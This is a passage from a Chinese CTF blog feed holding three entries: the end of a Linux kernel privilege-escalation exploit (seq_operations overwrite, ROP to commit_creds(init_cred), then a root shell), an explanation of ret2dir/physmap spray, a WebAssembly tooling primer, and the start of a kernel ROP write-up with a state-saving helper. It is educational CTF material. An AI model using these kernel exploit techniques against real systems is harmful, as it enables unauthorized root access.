readChunk(<span class="number">0</span>, <span class="number">0x20</span>, buf);</span><br><span class="line"></span><br><span class="line">    kernel_offset = buf[<span class="number">0</span>] - SEQ_OPS_0;</span><br><span class="line">    kernel_base += kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset;</span><br><span class="line">    init_cred = INIT_CRED + kernel_offset;</span><br><span class="line">    pop_rdi_ret = POP_RDI_RET + kernel_offset;</span><br><span class="line">    commit_creds = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    gadget = <span class="number">0xffffffff8135b0f6</span> + kernel_offset; <span class="comment">// add rsp 一个数然后 pop 一堆寄存器最后ret，具体的不记得了，懒得再回去翻了</span></span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = gadget;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += <span class="number">9</span>;</span><br><span class="line">    writeChunk(<span class="number">0</span>, <span class="number">0x20</span>, buf);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">        <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x999999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x114514;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x666666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x1919114514;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0xabcd1919810;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="retdir"><a href="#retdir" class="headerlink" title="retdir"></a>retdir</h2><p>ret2dir 是哥伦比亚大学网络安全实验室在 2014 年提出的一种辅助攻击手法，主要用来<strong>绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段</strong>，原论文见<a href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf">此处</a>。</p><p>我们首先来思考一下 <a href="https://elixir.bootlin.com/linux/v5.4.265/source/Documentation/x86/x86_64/mm.rst">x86 下的 Linux kernel 的内存布局</a>，存在着这样的一块区域叫做 <code>direct mapping area</code>，<strong>线性地直接映射了整个物理内存空间</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br></pre></td></tr></table></figure><p>这块区域的存在意味着：对于一个被用户进程使用的物理页框，<strong>同时存在着一个用户空间地址与内核空间地址到该物理页框的映射</strong>，即我们利用这两个地址进行内存访问时访问的是同一个物理页框。</p><p>当开启了 SMEP、SMAP、PXN 等防护时，内核空间到用户空间的直接访问被禁止，<strong>我们无法直接使用类似 ret2usr 这样的攻击方式</strong>，但利用内核线性映射区对整个物理地址空间的映射，<strong>我们可以利用一个内核空间上的地址访问到用户空间的数据，从而绕过 SMEP、SMAP、PXN 等传统的隔绝用户空间与内核空间的防护手段</strong>。</p><p>下图便是原论文中对 ret2dir 这种攻击的示例，我们在用户空间中布置的 gadget 可以通过 direct mapping area 上的地址<strong>在内核空间中访问到</strong>：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/figure/ret2dir-shellcode.png" alt="image.png"></p><p>但需要注意的是<strong>在新版的内核当中 direct mapping area 已经不再具有可执行权限</strong>，因此我们很难再在用户空间直接布置 shellcode 进行利用，<strong>但我们仍能通过在用户空间布置 ROP 链的方式完成利用</strong>：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/figure/ret2dir-rop.png" alt="image.png"></p><p>比较朴素的一种使用 ret2dir 进行攻击的手法便是：</p><ul><li>利用 mmap 在用户空间大量喷射内存。</li><li>利用漏洞泄露出内核的 “堆” 上地址（通过 kmalloc 获取到的地址），<strong>这个地址直接来自于线性映射区</strong>。</li><li>利用泄露出的内核线性映射区的地址<strong>进行内存搜索</strong>，从而找到我们在用户空间喷射的内存。</li></ul><p><strong>此时我们就获得了一个映射到用户空间的内核空间地址，我们通过这个内核空间地址便能直接访问到用户空间的数据，从而避开了传统的隔绝用户空间与内核空间的防护手段</strong>。</p><p>需要注意的是我们往往没有内存搜索的机会，因此需要<strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个线性映射区上的地址进行利用，这样我们就<strong>有很大的概率命中到我们布置的 payload 上</strong>，这种攻击手法也称为 <code>physmap spray</code>。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WASM初识</title>
      <link href="/posts/1523/"/>
      <url>/posts/1523/</url>
      
        <content type="html"><![CDATA[<h1 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h1><p>WASM即WebAssembly</p><p>其是Google开发的一款浏览器中使用的汇编语言.设计的初衷是使用c原生binary加速jiavascript的计算行为。wasm编译形成的binary类似一种<strong><u>基于栈的虚拟机</u></strong>，<strong>有自己的编译器和指令集。</strong></p><p>要谈webassembly的历史就得谈到 <code>javaScript</code> 了，众所周知， <code>javaScript</code> 是一门动态类型的语言，编写程序时无需考虑变量类型，而且还可以运行时改变类型。对于开发者，确实很方便，但对于运行它的引擎就很有问题了。看一下 <code>V8</code> 引擎从 <code>js</code> 源码到执行的一个过程。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/v2-8a34ae8c1a7a0f87e19b1384a025e354_720w.webp" alt="img"></p><p>由于 <code>js</code> 的动态类型，解释器在执行代码的时候会在类型判断上带来一定的性能消耗，降低执行速度。所以 <code>V8</code> 引擎采用了 <code>JIT</code>（即时编译技术） 技术，<u>监控一些经常执行的代码，将其编译成 <code>CPU</code> 直接执行的机器码</u>，提高执行速度。但由于 <code>js</code> 动态类型，在某些情况下还得反优化，回到字节码进行执行。</p><p>随着前端的不断发展，项目的大小和复杂度不断增大，对于某些场景，性能上可能已经无法满足，浏览器厂商们也一直在探索性能优化的方法。</p><h3 id="NaCl-PNaCl"><a href="#NaCl-PNaCl" class="headerlink" title="NaCl/PNaCl"></a>NaCl/PNaCl</h3><p><code>2011</code> 年 <code>Google</code> 在 <code>Chrome</code> 中使用了 <code>NaCl</code> 技术，可以使得 <code>C</code> 语言编写的程序运行到浏览器中，下边是维基百科的定义。</p><blockquote><p><strong>Google Native Client</strong>（缩写为<strong>NaCl</strong>），是一个由谷歌所发起的开放源代码计划，采用BSD许可证。它采用沙盒技术，让Intel x86、ARM或MIPS子集的机器代码直接在沙盒上运行。它能够从浏览器直接运行程序机器代码，独立于用户的操作系统之外，使Web应用程序可以用接近于机器代码运作的速度来运行，同时兼顾安全性。其功能类似于微软的 ActiveX，但是ActiveX只支持视窗系统。</p></blockquote><p>但一个完整的 <code>NaCl</code> 应用，在分发时需要提供支持多个架构平台（X86 / X64 / ARM 等）的模块文件，后来谷歌又推出了与底层架构无关的 <code>PNaCl</code> 技术。但由于其开发难度、兼容性等问题最终没有普及开来。在 <code>2017</code> 年 <code>Google</code> 宣布放弃 <code>PNaCl</code> 转向 <code>WebAssembly</code>。</p><h3 id="ASM-js"><a href="#ASM-js" class="headerlink" title="ASM.js"></a>ASM.js</h3><p><code>ASM.js</code> 是 <code>Mozilla</code> 在 <code>2013</code> 年推出的，是 <code>javaScript</code> 的一个严格子集，可以作为 <code>C/C++</code> 编译的目标语言，从而使得 <code>js</code> 引擎可以采用 <code>AOT(Ahead Of Time)</code> 的编译策略，也就是在运行前直接编译成机器码，因此运行速度会有一定的提升。</p><p><code>ASM.js</code> 通常不直接编写，而是作为一种通过编译器生成的中间语言，该编译器获取 <code>C++</code> 或其他语言的源代码，然后输出 <code>ASM.js</code>。</p><p>例如下边的 <code>C</code> 语言代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过编译器编译会生成下边的 <code>js</code> 代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">  i = i|<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (i + <span class="number">1</span>)|<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里的<code>|0</code> 在 <code>js</code> 中相当于和 <code>0</code> 进行了或操作，所以不影响原本的逻辑。在 <code>asm.js</code> 中起到了类型标记的作用，这样 <code>js</code> 引擎执行的时候就知道 <code>i</code> 是一个整型，返回值是一个整型。除了或操作这种，<code>ASM.js</code> 标准中还规定了很多类似的标记规则，用于告诉 <code>js</code> 引擎变量的类型，便于进行 <code>AOT</code> 优化。</p><p>这看起来和 <code>TypeScript</code> 很像，但其实不是一种东西。<code>TypeScript</code> 是 <code>js</code> 的一个超集，浏览器并不能直接执行 <code>ts</code>，还需要转换为 <code>js</code> 去执行。<code>ts</code> 主要是帮助我们开发人员去看的，增加了代码的可读性，也可以让编辑器提前发现一些错误。而 <code>asm.js</code> 是用于引擎的编译优化。</p><h3 id="WebAssembly"><a href="#WebAssembly" class="headerlink" title="WebAssembly"></a>WebAssembly</h3><p>接下来看一下 <code>WebAssembly</code> 的历史。</p><blockquote><p>2015 年 4 月，WebAssembly Community Group 成立；<br>2015 年 6 月，WebAssembly 第一次以 WCG 的官方名义向外界公布；<br>2016 年 8 月，WebAssembly 开始进入了漫长的 “Browser Preview” 阶段；<br>2017 年 2 月，WebAssembly 官方 LOGO 在 Github 上的众多讨论中被最终确定；同年同月，一个历史性的阶段，四大浏览器（FireFox、Chrome、Edge、WebKit）在 WebAssembly 的 MVP（最小可用版本）标准实现上达成共识，这意味着 WebAssembly 在其 MVP 标准上的 “Brower Preview” 阶段已经结束；<br>2017 年 8 月，W3C WebAssembly Working Group 成立，意味着 WebAssembly 正式成为 W3C 众多技术标准中的一员。</p></blockquote><p><code>WebAssembly</code> 于 <code>2019</code> 年 <code>12</code> 月 <code>5</code> 日成为万维网联盟（<code>W3C</code>）的推荐标准，与 <code>HTML</code>，<code>CSS</code> 和 <code>JavaScript</code> 一起成为 <code>Web</code> 的第四种语言。</p><p>可以看一下目前浏览器的支持程度，已经算比较高了。</p><p><img src="https://pica.zhimg.com/80/v2-62c512d5a8cb3b63c585721c223afeb5_720w.webp?source=1def8aca" alt="img"></p><h1 id="环境搭建及工具"><a href="#环境搭建及工具" class="headerlink" title="环境搭建及工具"></a>环境搭建及工具</h1><h2 id="开发环境emscripten"><a href="#开发环境emscripten" class="headerlink" title="开发环境emscripten"></a>开发环境emscripten</h2><p><a href="https://emscripten.org/">emscripten</a> 是一套编译构建方案，同时提供了比较完整的 SDK ，它在。它使我们可以非常方便地使用 C 语言完成 WebAssembly 相关的开发与环境集成。</p><p>安装的方式，是先拉取 git 代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/emscripten-core/emsdk.git</span><br></pre></td></tr></table></figure><p>进入目录后，执行安装，它会下载 C 编辑器，nodejs 等一堆东西：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd emsdk</span><br><span class="line">./emsdk install latest</span><br><span class="line">./emsdk activate latest</span><br></pre></td></tr></table></figure><p>最后处理一下环境（效果只在终端的当前会话有效）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ./emsdk_env.sh</span><br></pre></td></tr></table></figure><p>当 <code>emcc</code> 是一个可执行命令时，整个环境就准备好了。</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>写一个最简单的hello world程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用命令行编译</p><p><code>emcc hello.c -o hello.html</code></p><p>因为这个编译出来是html,所以用python搭建一个服务器运行验证一下,</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 9000</span><br></pre></td></tr></table></figure><p>之后访问<code>127.0.0.1:9000/hello.html</code>可以看到<code>hello world</code>的消息。以及emsc控制台的界面。</p><h3 id="更多选项"><a href="#更多选项" class="headerlink" title="更多选项"></a>更多选项</h3><p>emcc —help查看</p><h4 id="o"><a href="#o" class="headerlink" title="-o"></a>-o</h4><p>在上一步中我们指定编译结果为html格式</p><p>实际上可以有更多形式</p><p>文档原话是</p><blockquote><p>“-o <target>“<br>   [link] When linking an executable, the “target” file name extension<br>   defines the output type to be generated:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">* &lt;name&gt; **.js** : JavaScript (+ separate **&lt;name&gt;.wasm** file</span><br><span class="line">  if emitting WebAssembly). (default)</span><br><span class="line"></span><br><span class="line">* &lt;name&gt; **.mjs** : ES6 JavaScript module (+ separate</span><br><span class="line">  **&lt;name&gt;.wasm** file if emitting WebAssembly).</span><br><span class="line"></span><br><span class="line">* &lt;name&gt; **.html** : HTML + separate JavaScript file</span><br><span class="line">  (**&lt;name&gt;.js**; + separate **&lt;name&gt;.wasm** file if emitting</span><br><span class="line">  WebAssembly).</span><br><span class="line"></span><br><span class="line">* &lt;name&gt; **.wasm** : WebAssembly without JavaScript support code</span><br><span class="line">  (&quot;standalone Wasm&quot;; this enables &quot;STANDALONE_WASM&quot;).</span><br></pre></td></tr></table></figure><p>   These rules only apply when linking.  When compiling to object code<br>   (See <em>-c</em> below) the name of the output file is irrelevant.</p></blockquote><p>即-o选项指定的<code>生成文件名的后缀</code>会影响编译结果的文件格式及数量</p><p>一般要<u>生成能够由wasm运行时直接运行的文件需要<code>.wasm</code>后缀格式</u>,即webassembly二进制格式</p><h4 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h4><p>指定编译时的一些设置变量</p><p>例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-s WASM=1</span><br><span class="line">-s PURE_WASI=1#尽可能的使用WASI API</span><br><span class="line">-s STACK_OVERFLOW_CHECK=1</span><br></pre></td></tr></table></figure><p>还有许多变量参数,可以在 <code>$HOME/emsdk/upstream/emscripten/src/</code>目录下的<code>setting.js</code>文件中查看</p><h4 id="g"><a href="#g" class="headerlink" title="-g"></a>-g</h4><p>保留调试符号信息</p><blockquote><p>“-g<level>“<br>   [compile+link] Controls the level of debuggability. Each level<br>   builds on the previous one:</p><pre><code>  * &quot;-g0&quot;: Make no effort to keep code debuggable.  * &quot;-g1&quot;: When linking, preserve whitespace in JavaScript.  * &quot;-g2&quot;: When linking, preserve function names in compiled code.  * &quot;-g3&quot;: When compiling to object files, keep debug info,    including JS whitespace, function names, and LLVM debug info    (DWARF) if any (this is the same as -g).</code></pre></blockquote><h4 id="O"><a href="#O" class="headerlink" title="-O"></a>-O</h4><p>开启优化</p><h2 id="WASM运行时"><a href="#WASM运行时" class="headerlink" title="WASM运行时"></a>WASM运行时</h2><p>wasm运行时即用于加载、解释和执行 WebAssembly 模块的软件层,其可以模拟浏览器运行wasm的环境,在不启动浏览器的环境下操作wasm</p><p>WASM有四种主流的运行时,分别是</p><p><strong>wasmedge、wasmtime、wasmer、WAVM</strong> </p><p>ctf比赛中出现的比较多的是wasmtime,这里着重介绍它</p><h3 id="wasmtime"><a href="#wasmtime" class="headerlink" title="wasmtime"></a>wasmtime</h3><p>github仓库<a href="https://github.com/bytecodealliance/wasmtime">bytecodealliance/wasmtime: A fast and secure runtime for WebAssembly (github.com)</a></p><p>可以下载历史版本的wasmtime</p><p>主要命令如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Commands:</span><br><span class="line">  run       Runs a WebAssembly module</span><br><span class="line">  config    Controls Wasmtime configuration settings</span><br><span class="line">  compile   Compiles a WebAssembly module</span><br><span class="line">  explore   Explore the compilation of a WebAssembly module to native code</span><br><span class="line">  serve     Serves requests from a wasi-http proxy component</span><br><span class="line">  settings  Displays available Cranelift settings for a target</span><br><span class="line">  wast      Runs a WebAssembly test script file</span><br><span class="line">  help      Print this message or the help of the given subcommand(s)</span><br></pre></td></tr></table></figure><h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p>运行wasm文件或者cwasm文件,不过大概率要求加—allow-precompiled选项</p><h4 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h4><p>将wasm文件编译为当前架构下的可执行文件格式(e.g. ELF)</p><p>后缀.cwasm(compiled wasm)</p><p>不过依然不能直接运行,还是要wasmtime执行</p><h4 id="更多选项-1"><a href="#更多选项-1" class="headerlink" title="更多选项"></a>更多选项</h4><h5 id="D"><a href="#D" class="headerlink" title="-D"></a>-D</h5><p>调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-D, --debug &lt;KEY[=VAL[,..]]&gt;</span><br><span class="line">         Debug-related configuration options, `-D help` to see all</span><br></pre></td></tr></table></figure><h5 id="—env"><a href="#—env" class="headerlink" title="—env"></a>—env</h5><p>设置环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--env &lt;NAME[=VAL]&gt;</span><br><span class="line">          Pass an environment variable to the program.</span><br></pre></td></tr></table></figure><h5 id="—invoke"><a href="#—invoke" class="headerlink" title="—invoke"></a>—invoke</h5><p>单独执行某个函数,可以指定参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--invoke &lt;FUNCTION&gt;</span><br><span class="line">          The name of the function to run</span><br><span class="line"></span><br><span class="line">Invoking a specific function (e.g. `add`) in a WebAssembly module:</span><br><span class="line"></span><br><span class="line">wasmtime --invoke add example.wasm 1 2</span><br></pre></td></tr></table></figure><h5 id="—allow-precompiled"><a href="#—allow-precompiled" class="headerlink" title="—allow-precompiled"></a>—allow-precompiled</h5><p>允许提前编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--allow-precompiled</span><br><span class="line">          Allow executing precompiled WebAssembly modules as `*.cwasm` files.</span><br><span class="line">          </span><br><span class="line">          Note that this option is not safe to pass if the module being passed in is arbitrary user input. Only `wasmtime`-precompiled modules generated via the `wasmtime compile` command or equivalent should be passed as an argument with this option specified.</span><br></pre></td></tr></table></figure><h5 id="—disable-cache-deprecated"><a href="#—disable-cache-deprecated" class="headerlink" title="—disable-cache(deprecated)"></a>—disable-cache(deprecated)</h5><p>老版本选项,不使用缓存</p><h3 id="wabt"><a href="#wabt" class="headerlink" title="wabt"></a>wabt</h3><p>The WebAssembly Binary Toolkit</p><p>官方仓库<a href="https://github.com/WebAssembly/wabt">WebAssembly/wabt: The WebAssembly Binary Toolkit (github.com)</a></p><p>提供了一组wasm的工具包</p><p>主要如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WABT (we pronounce it &quot;wabbit&quot;) is a suite of tools for WebAssembly, including:</span><br><span class="line"></span><br><span class="line">wat2wasm: translate from WebAssembly text format to the WebAssembly binary format</span><br><span class="line">wasm2wat: the inverse of wat2wasm, translate from the binary format back to the text format (also known as a .wat)</span><br><span class="line">wasm-objdump: print information about a wasm binary. Similiar to objdump.</span><br><span class="line">wasm-interp: decode and run a WebAssembly binary file using a stack-based interpreter</span><br><span class="line">wasm-decompile: decompile a wasm binary into readable C-like syntax.</span><br><span class="line">wat-desugar: parse .wat text form as supported by the spec interpreter (s-expressions, flat syntax, or mixed) and print &quot;canonical&quot; flat format</span><br><span class="line">wasm2c: convert a WebAssembly binary file to a C source and header</span><br><span class="line">wasm-strip: remove sections of a WebAssembly binary file</span><br><span class="line">wasm-validate: validate a file in the WebAssembly binary format</span><br><span class="line">wast2json: convert a file in the wasm spec test format to a JSON file and associated wasm binary files</span><br><span class="line">wasm-stats: output stats for a module</span><br><span class="line">spectest-interp: read a Spectest JSON file, and run its tests in the interpreter</span><br></pre></td></tr></table></figure><p>还有其他一些小工具</p><p>wat即Webassembly的文本格式</p><h3 id="WASI"><a href="#WASI" class="headerlink" title="WASI"></a>WASI</h3><p><a href="https://wasi.dev/">WASI </a></p><blockquote><p>WASI is a modular <strong>system interface for WebAssembly</strong>. As described in <a href="https://hacks.mozilla.org/2019/03/standardizing-wasi-a-webassembly-system-interface/">the initial announcement</a>, it’s focused on security and portability.</p></blockquote><p>WebAssembly是一种新的字节码格式，目前被应用于 web 中，由于其可移植、体积小，安全性的等优点被渐渐广泛认可，但是其主要是运行在浏览器中。</p><p>一些天才们想让 WebAssembly 也可以<strong>运行在非浏览器环境中</strong>，这就产生了 WASI。</p><p>wasi需要可移植的二进制文件（.wasm）和一个跨平台的 runtime，也就是说，我们在某一个平台上生成了.wasm，直接拿到其他平台上，也可以直接使用。</p><h1 id="WASM调试"><a href="#WASM调试" class="headerlink" title="WASM调试"></a>WASM调试</h1><p>wasm类题目调试是一大难点</p><p>特别是当提供的是经由wasmtime等运行时二次编译过的适应架构的文件,例如cwasm格式文件</p><h2 id="浏览器调试"><a href="#浏览器调试" class="headerlink" title="浏览器调试"></a>浏览器调试</h2><p>如果提供的文件是非由运行时二次编译的文件</p><p>那么可以使用chrome浏览器的开发者工具进行调试</p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>如果提供的文件是由运行时二次编译的文件</p><p>由于几乎没有符号信息,且代码量较大,想要静态分析难度不低</p><p>那么就得使用gdb进行调试</p><p><code>gdb --args wasmtime --allow-precompiled  cwasm</code></p><p>不过这样显然是直接调试wasmtime程序,而不是我们希望的二进制文件</p><p>但是最终程序控制流肯定会转移给cwasm文件,而既然是题目那就肯定存在由用户控制的输入</p><p>所以我们可以直接运行直到自动断在有输入处,可以发现最终是直接运行cwasm映射在内存中的代码段</p><p>例如,这是2023强网杯WTOA的text段映射,整个text都被映射在这(elf中text段大小就是0xc000)</p><p><code>0x7ffff79fe000     0x7ffff7a0a000 r-xp     c000   1000 /home/aichch/pwn/WTOA/wtoa</code></p><p>段内偏移不变,但<strong>段与段之间的偏移是会变</strong>的</p><p>不过只要能够确定代码位置便足够了</p><p>之后触发各种函数,再由gdb回溯栈信息<u>得出各个重要函数的的位置</u>,并<u>回到ida中逆向分析</u></p><p>需要注意的是gdb分析给出的回溯栈信息并不完全准确</p><p>例如</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-01_142030.png" alt=""></p><p>这是最开始的回溯路径,但继续往下执行后它变成了</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-01_142230.png" alt=""></p><p>可见回溯栈少了一层,而且查看少的那层可以发现里面确实没有可执行代码</p><p>再往下,在即将再往下一层回溯时,栈又发生了变化</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-01_142601.png" alt=""></p><p>倒没有深入去研究这其中的原由,猜测可能是gdb栈回溯机制的原因</p><p>因为如此,对调试确定代码位置的难度又加大了一点,即不能直接一次性判断所有的栈回溯,而是要缓慢步进,根据正确的栈回溯信息作出判断</p><p>还有最后一点就是,就算确定了静态wasm的代码位置,真正进入静态分析就会发现内部依然是在嵌套调用其它函数,不过此时大可不必不停向下深入分析所有函数,只要能<u>根据经验</u>大致确认一两层便足够了</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2023强网杯-WTOA"><a href="#2023强网杯-WTOA" class="headerlink" title="2023强网杯-WTOA"></a>2023强网杯-WTOA</h2>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wasm </tag>
            
            <tag> webpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel学习笔记2</title>
      <link href="/posts/13785/"/>
      <url>/posts/13785/</url>
      
        <content type="html"><![CDATA[<h1 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 - core"></a>强网杯 2018 - core</h1><h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><p><strong>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由</strong> <code>system(&quot;/bin/sh&quot;)</code> <strong>变为了</strong> <code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code>，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。</p><h3 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h3><p>通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——<strong>保存各寄存器的值到内核栈上</strong>，以便于后续着陆回用户态。</p><p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p><blockquote><p>算是一个通用的 pwn 板子。</p><p>方便起见，使用了内联汇编，编译时需要指定参数：<code>-masm=intel</code>。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="返回用户态"><a href="#返回用户态" class="headerlink" 